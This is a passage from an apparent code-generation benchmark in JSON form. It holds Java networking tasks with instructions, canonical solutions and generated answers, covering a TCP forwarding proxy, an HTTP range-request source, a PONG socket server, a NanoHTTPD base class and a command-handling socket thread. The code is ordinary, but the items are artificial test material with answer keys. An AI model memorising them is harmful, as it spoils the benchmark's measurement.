    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class ConnectionManipulationProxyServer implements Runnable {\n    private final int localPort;\n    private final String host;\n    private final int remotePort;\n    private Thread proxyThread;\n    private final Object enableLock = new Object();\n    private volatile boolean enableProxy = false;\n    private volatile boolean running = false;\n    private ServerSocket serverSocket;\n    private Socket client;\n    private Socket server;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.host = host;\n        this.remotePort = remotePort;\n        this.localPort = localPort;\n    }\n\n    public void startProxy() {\n        synchronized (enableLock) {\n            if (!running) {\n                try {\n                    serverSocket = new ServerSocket(localPort);\n                    running = true;\n                    enableProxy = true;\n                    proxyThread = new Thread(this);\n                    proxyThread.start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public void stopProxy() {\n        synchronized (enableLock) {\n            enableProxy = false;\n            running = false;\n            killOpenSockets();\n        }\n    }\n\n    public void killOpenSockets() {\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n            if (client != null && !client.isClosed()) {\n                client.close();\n            }\n            if (server != null && !server.isClosed()) {\n                server.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void run() {\n        while (enableProxy && running) {\n            try {\n                client = serverSocket.accept();\n                server = new Socket(host, remotePort);\n\n                Thread toClient = new Thread(() -> {\n                    forwardData(server, client);\n                });\n\n                Thread toServer = new Thread(() -> {\n                    forwardData(client, server);\n                });\n\n                toClient.start();\n                toServer.start();\n            } catch (IOException e) {\n                if (enableProxy) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void forwardData(Socket from, Socket to) {\n        try (InputStream in = from.getInputStream(); OutputStream out = to.getOutputStream()) {\n            byte[] buffer = new byte[8192];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n                out.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (from != null && !from.isClosed()) {\n                    from.close();\n                }\n                if (to != null && !to.isClosed()) {\n                    to.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}\n```"
  },
  {
    "Task_id": 54,
    "Instruction": "Task Description: Implement a Java class that handles HTTP URL connections for streaming content with support for caching, custom headers, and partial content requests.\n\nClass Description: HttpUrlSource is a class designed to manage HTTP connections for streaming media content. It supports range requests, handles redirects, injects custom headers, and caches source information (URL, content length, MIME type). The class provides methods to open, read, and close connections while managing connection timeouts and redirects.\n\nAttributes:\n\nsourceInfoStorage: [SourceInfoStorage] - Storage for caching source information (URL, length, MIME type)\nheaderInjector: [HeaderInjector] - Injects custom headers into HTTP requests\nsourceInfo: [SourceInfo] - Contains information about the media source (URL, length, MIME type)\nconnection: [HttpURLConnection] - Active HTTP connection\ninputStream: [InputStream] - Input stream for reading content\n\nMethods:\n\nlength(): [long] - Returns the content length of the source, fetching it if not already cached\nopen([long] offset) -> [void] - Opens a connection to the source with optional byte offset\nclose() -> [void] - Closes the current connection\nread([byte[]] buffer) -> [int] - Reads data from the input stream into the buffer\ngetMime() -> [String] - Returns the MIME type of the source, fetching it if not already cached\ngetUrl() -> [String] - Returns the source URL\nfetchContentInfo() -> [void] - Fetches and caches content information (length and MIME type)\nopenConnection([long] offset, [int] timeout) -> [HttpURLConnection] - Opens a connection with optional offset and timeout, handling redirects\ninjectCustomHeaders([HttpURLConnection] connection, [String] url) -> [void] - Injects custom headers into the connection\nreadSourceAvailableBytes([HttpURLConnection] connection, [long] offset, [int] responseCode) -> [long] - Calculates available bytes based on response code\ngetContentLength([HttpURLConnection] connection) -> [long] - Extracts content length from connection headers",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.danikula.videocache.headers.HeaderInjector;\nimport com.danikula.videocache.sourcestorage.SourceInfoStorage;\nimport java.io.BufferedInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InterruptedIOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport static com.danikula.videocache.Preconditions.checkNotNull;\nimport static com.danikula.videocache.ProxyCacheUtils.DEFAULT_BUFFER_SIZE;\nimport static java.net.HttpURLConnection.HTTP_MOVED_PERM;\nimport static java.net.HttpURLConnection.HTTP_MOVED_TEMP;\nimport static java.net.HttpURLConnection.HTTP_OK;\nimport static java.net.HttpURLConnection.HTTP_PARTIAL;\nimport static java.net.HttpURLConnection.HTTP_SEE_OTHER;\n\npublic class HttpUrlSource {\n\n    private static final int MAX_REDIRECTS = 5;\n    private final SourceInfoStorage sourceInfoStorage;\n    private final HeaderInjector headerInjector;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector) {\n        this.sourceInfoStorage = checkNotNull(sourceInfoStorage);\n        this.headerInjector = checkNotNull(headerInjector);\n        SourceInfo sourceInfo = sourceInfoStorage.get(url);\n        this.sourceInfo = sourceInfo != null ? sourceInfo :\n                new SourceInfo(url, Integer.MIN_VALUE, ProxyCacheUtils.getSupposablyMime(url));\n    }\n\n    public synchronized long length() throws ProxyCacheException {\n        if (sourceInfo.length == Integer.MIN_VALUE) {\n            fetchContentInfo();\n        }\n        return sourceInfo.length;\n    }\n\n    public void open(long offset) throws ProxyCacheException {\n        try {\n            connection = openConnection(offset, -1);\n            String mime = connection.getContentType();\n            inputStream = new BufferedInputStream(connection.getInputStream(), DEFAULT_BUFFER_SIZE);\n            long length = readSourceAvailableBytes(connection, offset, connection.getResponseCode());\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error opening connection for \" + sourceInfo.url + \" with offset \" + offset, e);\n        }\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) throws IOException {\n        long contentLength = getContentLength(connection);\n        return responseCode == HTTP_OK ? contentLength\n                : responseCode == HTTP_PARTIAL ? contentLength + offset : sourceInfo.length;\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        String contentLengthValue = connection.getHeaderField(\"Content-Length\");\n        return contentLengthValue == null ? -1 : Long.parseLong(contentLengthValue);\n    }\n\n    public void close() throws ProxyCacheException {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (NullPointerException | IllegalArgumentException e) {\n                throw new RuntimeException(\"Error closing connection\", e);\n            }\n        }\n    }\n\n    public int read(byte[] buffer) throws ProxyCacheException {\n        if (inputStream == null) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url + \": connection is absent!\");\n        }\n        try {\n            return inputStream.read(buffer, 0, buffer.length);\n        } catch (InterruptedIOException e) {\n            throw new InterruptedProxyCacheException(\"Reading source \" + sourceInfo.url + \" is interrupted\", e);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url, e);\n        }\n    }\n\n    private void fetchContentInfo() throws ProxyCacheException {\n        HttpURLConnection urlConnection = null;\n        InputStream inputStream = null;\n        try {\n            urlConnection = openConnection(0, 10000);\n            long length = getContentLength(urlConnection);\n            String mime = urlConnection.getContentType();\n            inputStream = urlConnection.getInputStream();\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error fetching info from \" + sourceInfo.url, e);\n        } finally {\n            ProxyCacheUtils.close(inputStream);\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) throws IOException, ProxyCacheException {\n        HttpURLConnection connection;\n        boolean redirected;\n        int redirectCount = 0;\n        String url = this.sourceInfo.url;\n        do {\n            connection = (HttpURLConnection) new URL(url).openConnection();\n            injectCustomHeaders(connection, url);\n            if (offset > 0) {\n                connection.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            int code = connection.getResponseCode();\n            redirected = code == HTTP_MOVED_PERM || code == HTTP_MOVED_TEMP || code == HTTP_SEE_OTHER;\n            if (redirected) {\n                url = connection.getHeaderField(\"Location\");\n                redirectCount++;\n                connection.disconnect();\n            }\n            if (redirectCount > MAX_REDIRECTS) {\n                throw new ProxyCacheException(\"Too many redirects: \" + redirectCount);\n            }\n        } while (redirected);\n        return connection;\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String url) {\n        Map<String, String> extraHeaders = headerInjector.addHeaders(url);\n        for (Map.Entry<String, String> header : extraHeaders.entrySet()) {\n            connection.setRequestProperty(header.getKey(), header.getValue());\n        }\n    }\n\n    public synchronized String getMime() throws ProxyCacheException {\n        if (TextUtils.isEmpty(sourceInfo.mime)) {\n            fetchContentInfo();\n        }\n        return sourceInfo.mime;\n    }\n\n    public String getUrl() {\n        return sourceInfo.url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpUrlSource {\n    private final SourceInfoStorage sourceInfoStorage;\n    private final HeaderInjector headerInjector;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public HttpUrlSource(SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector) {\n        this.sourceInfoStorage = sourceInfoStorage;\n        this.headerInjector = headerInjector;\n    }\n\n    public long length() throws IOException {\n        if (sourceInfo == null || sourceInfo.getLength() <= 0) {\n            fetchContentInfo();\n        }\n        return sourceInfo.getLength();\n    }\n\n    public void open(long offset) throws IOException {\n        connection = openConnection(offset, 10000);\n        inputStream = connection.getInputStream();\n    }\n\n    public void close() {\n        try {\n            if (inputStream != null) inputStream.close();\n            if (connection != null) connection.disconnect();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public int read(byte[] buffer) throws IOException {\n        if (inputStream == null) {\n            throw new IOException(\"Connection not opened\");\n        }\n        return inputStream.read(buffer);\n    }\n\n    public String getMime() throws IOException {\n        if (sourceInfo == null || sourceInfo.getMimeType() == null || sourceInfo.getMimeType().isEmpty()) {\n            fetchContentInfo();\n        }\n        return sourceInfo.getMimeType();\n    }\n\n    public String getUrl() {\n        return sourceInfo.getUrl();\n    }\n\n    private void fetchContentInfo() throws IOException {\n        HttpURLConnection infoConn = openConnection(0, 5000);\n        long contentLength = getContentLength(infoConn);\n        String mimeType = infoConn.getContentType();\n        String url = infoConn.getURL().toString();\n        sourceInfo = new SourceInfo(url, contentLength, mimeType);\n        sourceInfoStorage.save(sourceInfo);\n        infoConn.disconnect();\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) throws IOException {\n        URL urlObj = new URL(sourceInfo.getUrl());\n        HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.setConnectTimeout(timeout);\n        conn.setReadTimeout(timeout);\n        conn.setInstanceFollowRedirects(false);\n\n        injectCustomHeaders(conn, urlObj.toString());\n\n        if (offset > 0) {\n            conn.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_PARTIAL || responseCode == HttpURLConnection.HTTP_OK) {\n            long availableBytes = readSourceAvailableBytes(conn, offset, responseCode);\n            if (availableBytes > 0 && (sourceInfo == null || sourceInfo.getLength() <= 0)) {\n                sourceInfo = new SourceInfo(urlObj.toString(), availableBytes, conn.getContentType());\n                sourceInfoStorage.save(sourceInfo);\n            }\n        } else if (responseCode >= 300 && responseCode < 400) {\n            String redirectLocation = conn.getHeaderField(\"Location\");\n            if (redirectLocation != null) {\n                conn.disconnect();\n                return openConnection(offset, timeout);\n            }\n        }\n\n        return conn;\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String url) {\n        for (String key : headerInjector.getHeaders().keySet()) {\n            connection.setRequestProperty(key, headerInjector.getHeaders().get(key));\n        }\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) {\n        if (responseCode == HttpURLConnection.HTTP_PARTIAL) {\n            String contentRange = connection.getHeaderField(\"Content-Range\");\n            if (contentRange != null) {\n                String[] parts = contentRange.split(\"/\");\n                if (parts.length > 1 && !parts[1].equals(\"*\")) {\n                    try {\n                        return Long.parseLong(parts[1]) - offset;\n                    } catch (NumberFormatException e) {\n                        return -1;\n                    }\n                }\n            }\n        } else if (responseCode == HttpURLConnection.HTTP_OK) {\n            return getContentLength(connection);\n        }\n        return -1;\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        String contentLengthHeader = connection.getHeaderField(\"Content-Length\");\n        if (contentLengthHeader != null) {\n            try {\n                return Long.parseLong(contentLengthHeader);\n            } catch (NumberFormatException e) {\n                return -1;\n            }\n        }\n        return -1;\n    }\n}\n```"
  },
  {
    "Task_id": 540,
    "Instruction": "Task Description: Implement a TCP proxy server class that can forward traffic between a client and a remote server, with the ability to start, stop, and manage connections dynamically.\n\nClass Description: The ConnectionManipulationProxyServer class acts as a TCP proxy that listens on a local port, accepts client connections, and forwards traffic to a specified remote host and port. It provides thread-safe control over the proxy's operation and proper resource cleanup.\n\nAttributes:\n- localPort: [int] - The local port on which the proxy listens for client connections\n- host: [String] - The remote host address to which traffic will be forwarded\n- remotePort: [int] - The remote port to which traffic will be forwarded\n- proxyThread: [Thread] - The thread running the proxy operation\n- enableLock: [Object] - Synchronization lock for thread-safe operation control\n- enableProxy: [boolean] - Flag indicating whether the proxy is currently enabled\n- running: [boolean] - Flag indicating whether the proxy thread should continue running\n- client: [Socket] - The client-side socket connection\n- server: [Socket] - The server-side socket connection\n- serverSocket: [ServerSocket] - The server socket listening for client connections\n\nMethods:\n- ConnectionManipulationProxyServer([String host, int remotePort, int localPort]) -> [void] - Constructor that initializes the proxy with target host and port information\n- startProxy() -> [void] - Starts the proxy server thread and enables traffic forwarding\n- stopProxy() -> [void] - Stops the proxy server thread and disables traffic forwarding\n- killOpenSockets() -> [void] - Closes all open sockets and cleans up resources\n- run() -> [void] - Main proxy thread execution method that handles connection setup and data forwarding\n- getLocalPort() -> [int] - Returns the local port on which the proxy is listening",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Logger;\n\npublic class ConnectionManipulationProxyServer implements Runnable {\n    private static final Logger log = Logger.getLogger(ConnectionManipulationProxyServer.class.getName());\n    private int localPort;\n    private String host;\n    private int remotePort;\n    private Thread proxyThread;\n    private final Object enableLock = new Object();\n    private boolean enableProxy = true;\n    private boolean running = true;\n    private Socket client = null;\n    private Socket server = null;\n    private ServerSocket serverSocket = null;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.localPort = localPort;\n        this.remotePort = remotePort;\n        this.host = host;\n        this.proxyThread = new Thread(this);\n    }\n\n    public void startProxy() {\n        log.info(\"[CMPS Proxy] - Starting Proxy\");\n        synchronized (enableLock) {\n            enableProxy = true;\n        }\n        running = true;\n        proxyThread.start();\n    }\n\n    public void stopProxy() {\n        log.info(\"[CMPS Proxy] - Stopping Proxy\");\n        synchronized (enableLock) {\n            enableProxy = false;\n        }\n        running = false;\n        killOpenSockets();\n    }\n\n    private void killOpenSockets() {\n        log.info(\"[CMPS Proxy] - killOpenSockets Called.\");\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n            if (client != null) {\n                client.close();\n            }\n            if (server != null) {\n                server.close();\n            }\n        } catch (IOException ex) {\n            // Ignore during cleanup\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(\"[CMPS Proxy] - Proxy Thread running.\");\n        try {\n            final byte[] request = new byte[1024];\n            byte[] reply = new byte[4096];\n            \n            while (running) {\n                synchronized (enableLock) {\n                    if (!enableProxy) continue;\n                }\n\n                if (serverSocket == null || serverSocket.isClosed()) {\n                    serverSocket = new ServerSocket(localPort);\n                    localPort = serverSocket.getLocalPort();\n                }\n\n                log.info(\"[CMPS Proxy] - Waiting for incoming connection..\");\n                \n                try {\n                    client = serverSocket.accept();\n                    log.info(\"[CMPS Proxy] - Client Opened Connection to Proxy...\");\n                    \n                    final InputStream streamFromClient = client.getInputStream();\n                    final OutputStream streamToClient = client.getOutputStream();\n                    \n                    server = new Socket(host, remotePort);\n                    log.info(\"Proxy: Proxy Connected to Server\");\n                    \n                    final InputStream streamFromServer = server.getInputStream();\n                    final OutputStream streamToServer = server.getOutputStream();\n                    \n                    Thread thread = new Thread() {\n                        public void run() {\n                            int bytesRead;\n                            try {\n                                while ((bytesRead = streamFromClient.read(request)) != -1) {\n                                    streamToServer.write(request, 0, bytesRead);\n                                    streamToServer.flush();\n                                }\n                            } catch (IOException ex) {\n                                log.warning(\"[CMPS Proxy] - IOException in client to server stream: \" + ex.getMessage());\n                                try {\n                                    client.close();\n                                    server.close();\n                                } catch (IOException e) {\n                                    // Ignore during cleanup\n                                }\n                            }\n                        }\n                    };\n                    thread.start();\n                    \n                    int bytesRead;\n                    try {\n                        while ((bytesRead = streamFromServer.read(reply)) != -1) {\n                            streamToClient.write(reply, 0, bytesRead);\n                            streamToClient.flush();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException in server to client stream: \" + ex.getMessage());\n                        client.close();\n                        server.close();\n                    }\n                    \n                    streamToClient.close();\n                    \n                } catch (IOException ex) {\n                    log.warning(\"[CMPS Proxy] - General IO Exception caught in main Thread: \" + ex.getMessage());\n                    break;\n                } finally {\n                    try {\n                        if (server != null) {\n                            server.close();\n                        }\n                        if (client != null) {\n                            client.close();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException caught whilst closing proxy connection: \" + ex.getMessage());\n                    }\n                }\n            }\n            \n            if (!serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n            log.info(\"[CMPS Proxy] - Server Socket Closed, returning...\");\n            \n        } catch (IOException ex) {\n            log.warning(\"[CMPS Proxy] - Thread Connection lost: \" + ex.getMessage());\n            ex.printStackTrace();\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class ConnectionManipulationProxyServer implements Runnable {\n    private final int localPort;\n    private final String host;\n    private final int remotePort;\n    private Thread proxyThread;\n    private final Object enableLock = new Object();\n    private volatile boolean enableProxy = false;\n    private volatile boolean running = false;\n    private ServerSocket serverSocket;\n    private Socket client;\n    private Socket server;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.host = host;\n        this.remotePort = remotePort;\n        this.localPort = localPort;\n    }\n\n    public void startProxy() {\n        if (proxyThread == null || !proxyThread.isAlive()) {\n            synchronized (enableLock) {\n                if (!running) {\n                    running = true;\n                    enableProxy = true;\n                    proxyThread = new Thread(this);\n                    proxyThread.start();\n                }\n            }\n        }\n    }\n\n    public void stopProxy() {\n        synchronized (enableLock) {\n            enableProxy = false;\n        }\n    }\n\n    public void killOpenSockets() {\n        try {\n            if (client != null && !client.isClosed()) {\n                client.close();\n            }\n            if (server != null && !server.isClosed()) {\n                server.close();\n            }\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void run() {\n        try {\n            serverSocket = new ServerSocket(localPort);\n            while (enableProxy) {\n                try {\n                    client = serverSocket.accept();\n                    server = new Socket(host, remotePort);\n\n                    Thread clientToServer = new Thread(() -> {\n                        forwardData(client, server);\n                    });\n\n                    Thread serverToClient = new Thread(() -> {\n                        forwardData(server, client);\n                    });\n\n                    clientToServer.start();\n                    serverToClient.start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            killOpenSockets();\n            running = false;\n        }\n    }\n\n    private void forwardData(Socket from, Socket to) {\n        try (InputStream input = from.getInputStream(); OutputStream output = to.getOutputStream()) {\n            byte[] buffer = new byte[8192];\n            int bytesRead;\n            while ((bytesRead = input.read(buffer)) != -1) {\n                output.write(buffer, 0, bytesRead);\n                output.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                from.close();\n                to.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}\n```"
  },
  {
    "Task_id": 543,
    "Instruction": "Task Description: Implement a TCP server that listens for incoming connections and responds with a \"PONG\" message when a client connects. The server should run in a separate thread and be able to be gracefully shut down.\n\nClass Description: PingPongSocketServer is a TCP server implementation that listens on a specified port for client connections. Upon accepting a connection, it immediately sends a \"PONG\" response and closes the connection. The server runs in a dedicated thread and supports graceful termination.\n\nAttributes:\n- thread: Thread - The thread in which the server runs\n- serverSocket: ServerSocket - The socket that listens for incoming connections\n- terminated: boolean - Flag indicating whether the server should stop running\n\nMethods:\n- initialize(int port) -> void - Initializes the server by creating a ServerSocket on the specified port and starting the server thread\n- close() -> void - Gracefully shuts down the server by closing the ServerSocket and interrupting the server thread",
    "Canonical_solution": "import tech.powerjob.common.utils.CommonUtils;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.charset.StandardCharsets;\n\npublic class PingPongSocketServer implements PingPongServer {\n\n    private Thread thread;\n    private ServerSocket serverSocket;\n    private volatile boolean terminated = false;\n\n    @Override\n    public void initialize(int port) throws Exception {\n        serverSocket = new ServerSocket(port);\n\n        thread = new Thread(() -> {\n            while (true) {\n                if (terminated) {\n                    return;\n                }\n                try (Socket socket = serverSocket.accept();\n                     OutputStream outputStream = socket.getOutputStream()) {\n\n                    socket.setSoTimeout(2000);\n                    socket.setKeepAlive(false);\n\n                    outputStream.write(PingPongUtils.PONG.getBytes(StandardCharsets.UTF_8));\n                    outputStream.write(System.lineSeparator().getBytes(StandardCharsets.UTF_8));\n                    outputStream.flush();\n                } catch (Exception e) {\n                    if (!terminated) {\n                        log.warn(\"[PingPongSocketServer] process accepted socket failed!\", e);\n                    }\n                }\n            }\n        }, \"PingPongSocketServer-Thread\");\n\n        thread.start();\n    }\n\n    @Override\n    public void close() throws IOException {\n        terminated = true;\n        CommonUtils.executeIgnoreException(() -> serverSocket.close());\n        thread.interrupt();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class PingPongSocketServer {\n    private Thread thread;\n    private ServerSocket serverSocket;\n    private volatile boolean terminated = false;\n\n    public void initialize(int port) throws Exception {\n        serverSocket = new ServerSocket(port);\n        thread = new Thread(() -> {\n            try {\n                while (!terminated && !serverSocket.isClosed()) {\n                    Socket clientSocket = serverSocket.accept();\n                    OutputStream output = clientSocket.getOutputStream();\n                    output.write(\"PONG\\n\".getBytes());\n                    output.flush();\n                    clientSocket.close();\n                }\n            } catch (Exception e) {\n                if (!terminated) {\n                    e.printStackTrace();\n                }\n            }\n        });\n        thread.start();\n    }\n\n    public void close() throws Exception {\n        terminated = true;\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            serverSocket.close();\n        }\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n            thread.join();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 544,
    "Instruction": "Task Description: Create a lightweight HTTP server class that can handle incoming client connections and process requests through abstract methods that must be implemented by subclasses.\n\nClass Description: NanoHTTPD is a minimal HTTP server implementation that listens for incoming TCP connections on a specified port, handles client connections by providing input/output streams, and requires subclasses to implement the actual request processing logic.\n\nAttributes:\n- hostname: String - The hostname or IP address to bind the server to (nullable)\n- myPort: int - The port number to listen on\n- myServerSocket: ServerSocket - The server socket instance for accepting connections\n- myThread: Thread - The main listener thread for the server\n\nMethods:\n- NanoHTTPD(int port) -> void - Constructor that initializes the server with just a port number (hostname defaults to null)\n- NanoHTTPD(String hostname, int port) -> void - Constructor that initializes the server with both hostname and port\n- start() -> void - Starts the server by creating a ServerSocket and launching a daemon thread to accept connections\n- stop() -> void - Stops the server by closing the ServerSocket and joining the listener thread\n- handleConnection(InputStream inputStream, OutputStream outputStream) -> abstract void - Abstract method that must be implemented by subclasses to handle the actual client connection processing",
    "Canonical_solution": "import android.util.Log;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic abstract class NanoHTTPD {\n    private final String hostname;\n    private final int myPort;\n    private ServerSocket myServerSocket;\n    private Thread myThread;\n\n    public NanoHTTPD(int port) {\n        this(null, port);\n    }\n\n    public NanoHTTPD(String hostname, int port) {\n        this.hostname = hostname;\n        this.myPort = port;\n    }\n\n    public void start() throws IOException {\n        Log.i(\"NanoHTTPD\", \"server start\");\n        myServerSocket = new ServerSocket();\n        myServerSocket.bind((hostname != null) ? new InetSocketAddress(\n                hostname, myPort) : new InetSocketAddress(myPort));\n\n        myThread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                do {\n                    try {\n                        final Socket finalAccept = myServerSocket.accept();\n                        Log.i(\"NanoHTTPD\",\n                                \"accept request from \"\n                                        + finalAccept.getInetAddress());\n                        InputStream inputStream = finalAccept.getInputStream();\n                        OutputStream outputStream = finalAccept\n                                .getOutputStream();\n                        handleConnection(inputStream, outputStream);\n                        if (finalAccept != null) {\n                            finalAccept.close();\n                        }\n                    } catch (IOException e) {\n                    }\n                } while (!myServerSocket.isClosed());\n            }\n        });\n        myThread.setDaemon(true);\n        myThread.setName(\"NanoHttpd Main Listener\");\n        myThread.start();\n    }\n\n    public void stop() {\n        Log.i(\"NanoHTTPD\", \"server stop\");\n        try {\n            myServerSocket.close();\n            myThread.join();\n        } catch (IOException ioe) {\n            ioe.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    protected abstract void handleConnection(InputStream inputStream, OutputStream outputStream);\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic abstract class NanoHTTPD {\n    protected String hostname;\n    protected int myPort;\n    protected ServerSocket myServerSocket;\n    protected Thread myThread;\n\n    public NanoHTTPD(int port) {\n        this(null, port);\n    }\n\n    public NanoHTTPD(String hostname, int port) {\n        this.hostname = hostname;\n        this.myPort = port;\n    }\n\n    public void start() throws IOException {\n        myServerSocket = new ServerSocket(myPort, 0, hostname == null ? InetAddress.getByName(null) : InetAddress.getByName(hostname));\n        myThread = new Thread(() -> {\n            try {\n                while (!myThread.interrupted()) {\n                    Socket clientSocket = myServerSocket.accept();\n                    InputStream inputStream = clientSocket.getInputStream();\n                    OutputStream outputStream = clientSocket.getOutputStream();\n                    handleConnection(inputStream, outputStream);\n                    clientSocket.close();\n                }\n            } catch (IOException e) {\n                if (!myThread.interrupted()) {\n                    e.printStackTrace();\n                }\n            }\n        });\n        myThread.setDaemon(true);\n        myThread.start();\n    }\n\n    public void stop() throws IOException, InterruptedException {\n        if (myServerSocket != null && !myServerSocket.isClosed()) {\n            myServerSocket.close();\n        }\n        if (myThread != null) {\n            myThread.interrupt();\n            myThread.join();\n        }\n    }\n\n    public abstract void handleConnection(InputStream inputStream, OutputStream outputStream);\n}\n```"
  },
  {
    "Task_id": 545,
    "Instruction": "Task Description: Implement a TCP server thread class that handles incoming client connections, processes commands, and manages application state through network communication.\n\nClass Description: InnerSocketThread is a Thread subclass that creates a TCP server to listen for client connections on a specified port. It processes incoming commands to control application state and respond with status information.\n\nAttributes:\n- socket: ServerSocket - The server socket instance used to listen for incoming client connections\n\nMethods:\n- run() -> void - Main thread execution method that sets up the server socket, accepts connections, processes commands, and manages resources\n- read(InputStream in) -> String - Reads data from the input stream until carriage return is encountered\n- write(OutputStream os) -> void - Writes the current application status to the output stream\n\nMethod Details:\n1. run():\n   - Input: None (uses class attributes)\n   - Output: None\n   - Description: \n     1. Creates ServerSocket on Manager.PORT\n     2. Enters infinite loop to accept client connections\n     3. Sets socket timeout to 5000ms\n     4. Reads command from client\n     5. Processes commands (START, STATUS, FLUSHMETHOD)\n     6. Sends response for STATUS command\n     7. Closes client connection\n     8. Handles exceptions and ensures proper resource cleanup\n\n2. read(InputStream in):\n   - Input: \n     - in: InputStream - The input stream from client socket\n   - Output: String - The command string read from the stream\n   - Description:\n     1. Reads bytes from buffered input stream\n     2. Converts bytes to characters\n     3. Stops reading at carriage return ('\\r')\n     4. Returns accumulated string\n\n3. write(OutputStream os):\n   - Input:\n     - os: OutputStream - The output stream to client socket\n   - Output: None\n   - Description:\n     1. Writes \"running\" or \"stop\" based on Manager's switch flag\n     2. Appends carriage return\n     3. Flushes the output stream",
